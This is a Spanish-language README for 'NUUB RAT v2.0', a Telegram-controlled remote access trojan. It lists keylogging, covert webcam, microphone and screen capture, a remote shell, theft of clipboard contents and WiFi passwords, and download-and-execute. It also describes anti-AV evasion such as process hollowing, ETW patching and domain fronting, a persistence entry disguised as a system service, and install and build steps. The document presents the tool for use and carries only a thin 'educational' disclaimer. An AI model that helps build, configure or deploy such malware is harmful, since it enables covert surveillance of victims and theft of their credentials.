# NUUB RAT v2.0

Remote Access Tool con Clean Architecture, encriptación AES-256-GCM, y múltiples técnicas de evasión anti-AV.

## Características

### 28 Comandos de Telegram

| Categoría | Comandos |
|-----------|----------|
| **Sistema** | `/start` `/status` `/sysinfo` `/info` `/shutdown` |
| **Keylogger** | `/pause` `/resume` `/getlog` `/alert` `/unalert` `/alerts` |
| **Media** | `/take_photo` `/take_video` `/record_audio` `/screenshot` `/screenrecord` |
| **Control** | `/shell` `/clipboard` `/setclip` `/ps` `/kill` `/downloadexec` |
| **Archivos** | `/ls` `/mkdir` `/rm` `/cat` |
| **Info** | `/locate` `/wifi` |

### Evasión Anti-AV (8 técnicas)

| Nivel | Técnicas | Detección |
|-------|----------|-----------|
| **1** | AntiDebug, AntiVM, StringTable, ApiHash | ~70% |
| **2** | DirectSyscalls, ProcessHollowing, Polymorphism | ~50% |
| **3** | FilelessExec, EtwPatch, ModuleStomping | ~30% |
| **4** | DomainFronting, EncryptedC2 | ~20% |

### Seguridad

- Encriptación **AES-256-GCM** para datos exfiltrados
- **Argon2id** para derivación de keys
- **HMAC-SHA256** para verificación de integridad
- Compresión automática de archivos >10KB

## Instalación

### Método 1: Auto-Installer (Recomendado)

```bash
# Ejecutar nuub.exe por primera vez
nuub.exe

# Sigue las instrucciones en pantalla:
# [1/6] Bot Token
# [2/6] Admin Chat ID
# [3/6] PC Identifier
# [4/6] Encryption Password
# [5/6] Heartbeat Interval
# [6/6] Evasion Settings
```

### Método 2: PowerShell

```powershell
powershell -ExecutionPolicy Bypass -File tools\installer.ps1
```

### Método 3: Batch Script

```cmd
tools\quick_setup.bat
```

### Método 4: Python

```bash
python3 tools/installer.py
```

## Configuración

### config.json

```json
{
    "telegram_bot_token": "TU_TOKEN_AQUI",
    "admin_chat_ids": [123456789],
    "pc_identifier": "PC-001",
    "encryption_password": "password_secreto",
    "master_log_filename": "log_master.txt",
    "activity_log_filename": "activity_log.csv",
    "auto_start_entry_name": "SystemCoreService",
    "log_filename": "nuub.log",
    "heartbeat_interval_minutes": 30,
    "c2_encryption_key": "",
    "stealth_mode": false,
    "anti_debug": true,
    "anti_vm": false,
    "etw_patch": true,
    "process_hollowing": false
}
```

### Parámetros de Evasión

| Parámetro | Tipo | Descripción |
|-----------|------|-------------|
| `stealth_mode` | bool | Activa anti-VM + anti-debug |
| `anti_debug` | bool | Detecta debuggers y herramientas de análisis |
| `anti_vm` | bool | Detecta VMware, VirtualBox, Sandboxie |
| `etw_patch` | bool | Desactiva telemetría de Windows |
| `process_hollowing` | bool | Ejecuta dentro de explorer.exe |

## Uso

### Desde Telegram

1. Inicia tu bot con `/start`
2. Envía comandos desde tu chat privado

### Ejemplos

```
/sysinfo              → Info del sistema (OS, CPU, RAM, IP)
/screenshot           → Captura de pantalla
/shell dir            → Ejecutar comando
/clipboard            → Leer portapapeles
/wifi                 → Contraseñas WiFi guardadas
/ps                   → Lista de procesos
/kill 1234            → Matar proceso por PID
/locate               → Geolocalización IP
/alert password       → Alerta cuando detecta "password"
/downloadexec <url>   → Descargar y ejecutar archivo
```

## Compilación

### Requisitos

- Visual Studio 2022 o superior
- CMake 3.25+
- vcpkg

### Pasos

```bash
# Clonar
git clone <repo>
cd NUUB-VERSION-2

# Instalar dependencias
vcpkg install

# Configurar
cmake -B build -S . -DCMAKE_TOOLCHAIN_FILE=[vcpkg-root]/scripts/buildsystems/vcpkg.cmake

# Compilar
cmake --build build --config Release
```

### Salida

```
build\Release\nuub.exe          → Ejecutable principal
build\tests\Release\nuub_tests.exe  → Tests (45/45)
```

## Arquitectura

```
src/
├── domain/                  # Capa de dominio (sin dependencias externas)
│   ├── entities/           # Entidades: Admin, Config, KeystrokeEntry, ActivityEvent
│   ├── services/           # Servicios: Encryption, Keystroke, Reporting
│   └── common/             # Utilidades: Logger, Result, Types, Obfuscate, AntiAnalysis
│
├── application/             # Capa de aplicación
│   ├── commands/           # Handlers: Command, Media, Location, Shell, SysInfo, etc.
│   └── interfaces/         # Interfaces: IReporter, IMediaCapture, IShellService, etc.
│
├── infrastructure/          # Capa de infraestructura
│   ├── telegram/           # TelegramBot, TelegramReporter, HeartbeatService
│   ├── keyboard/           # WindowsKeyListener, KeyResolver, LinuxKeyListener
│   ├── media/              # OpenCVMediaCapture, LinuxScreenCapture
│   ├── network/            # IPGeolocationService
│   └── system/             # Persistence, Shell, Process, WiFi, FileManager
│
└── main.cpp                 # Punto de entrada con auto-installer
```

## Seguridad de Datos

- **Encriptación**: Todos los reportes se encriptan con AES-256-GCM
- **Compresión**: Archivos >10KB se comprimen antes de enviar
- **Password**: Se usa Argon2id para derivar keys (resistente a brute-force)
- **AAD**: PC identifier se usa como Additional Authenticated Data

## Tests

```bash
# Ejecutar todos los tests
ctest --test-dir build --build-config Release

# Resultado esperado: 45/45 tests pasan
```

### Cobertura

| Módulo | Tests | Cobertura |
|--------|-------|-----------|
| KeystrokeService | 6 | Core logging |
| EncryptionService | 10 | AES-GCM, key rotation |
| Admin | 6 | Auth, multi-admin |
| CommandHandler | 5 | Target matching |
| MediaHandler | 9 | Photo, video, audio, screenshot |
| LocationHandler | 4 | Geolocation |
| ShellHandler | 5 | Command execution |

## Disclaimer

Este software es para fines educacionales y de testing de seguridad autorizado. Úsalo solo en sistemas donde tengas autorización explícita. El autor no se hace responsable del uso indebido.

## Licencia

Uso privado. No distribuir sin autorización.
